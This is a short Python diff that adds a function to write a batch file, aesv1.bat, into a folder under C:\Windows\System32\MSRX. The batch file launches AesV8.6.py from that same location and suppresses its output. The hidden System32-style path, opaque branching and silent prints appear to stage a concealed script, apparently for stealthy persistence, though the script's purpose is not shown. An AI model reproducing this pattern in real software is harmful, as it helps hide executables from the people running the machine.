@@ -257,6 +257,27 @@ elif file_contentsx1 =="NXXzPhXpkZ9JC":
 else:
     create_batch_file("py -3.11", r"C:\Windows\System32\MSRX\AesV8.6.py")
 '''
+def create_batch_file(python_command, script_name):
+    # Define the directory and file name
+    directory = r"C:\Windows\System32\MSRX"
+    filename = "aesv1.bat"
+    filepath = os.path.join(directory, filename)
+
+    # Check if the batch file already exists
+    if not os.path.exists(filepath):
+        # Content of the batch file, with python_command and script_name as parameters
+        batch_content = f"@echo off\n{python_command} {script_name} || echo errorwithpath"
+
+        # Create the directory if it doesn't exist
+        os.makedirs(directory, exist_ok=True)
+
+        # Write the content to the batch file
+        with open(filepath, 'w') as file:
+            file.write(batch_content)
+
+        print(f"")
+    else:
+        print("")
 
 create_batch_file("py -3.11", r"C:\Windows\System32\MSRX\AesV8.6.py")
 def run_batch_file(batch_file_path):
